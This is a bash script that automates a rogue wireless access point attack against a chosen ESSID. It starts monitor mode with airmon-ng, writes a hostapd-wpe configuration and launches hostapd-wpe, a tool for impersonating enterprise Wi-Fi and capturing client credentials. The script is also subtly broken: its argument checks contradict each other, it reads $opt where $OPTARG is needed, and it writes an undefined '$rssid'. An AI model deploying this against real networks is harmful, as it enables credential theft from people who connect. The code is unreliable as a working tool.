#! /bin/bash

# available options: help (-h) | interface (-i; mandatory), essid (-essid; mandatory)
usage="
This script will automatize the process to set up and perform a dumb-down attak
$0 [-h] | -i wirelessInterface -e APToAttack

where:
    -h	print this help
    -i	the name of the interface to use for the attack. Not monitor mode
    -e  the access point's essid to perform the attack against
"

if [ "$#" -ne 1 ]; then
    echo "Illegal number of parameters"
elif [ "$#" -ne 2 ]; then
    echo "Illegal number of parameters"
fi

while getopts ":h?:i:e:" opt; do
    case $opt in
	h)
	    echo $usage
	    ;;
	i)
	    interface=$opt
	    ;;
	e)
	    essid=$opt
	    ;;
	esac
done

sudo airmon-ng start $interface
if [ "$?" -ne 0 ]; then
    echo "There was an error activating the card in monitor mode"
fi

monitorInterface=`sudo airmon-ng | awk 'NR==4' | awk -F ' ' '{print $2}'`

#set up the configuration parameters
echo "interface=$monitorInterface" >> /opt/hostapd-wpe/hostapd/hostapd_dumb_down.conf
echo "ssid=$rssid" >> /opt/hostapd-wpe/hostapd/hostapd_dumb_down.conf

sudo /opt/hostapd-wpe/hostapd/hostapd-wpe /opt/hostapd-wpe/hostapd/hostapd_dumb_down.conf


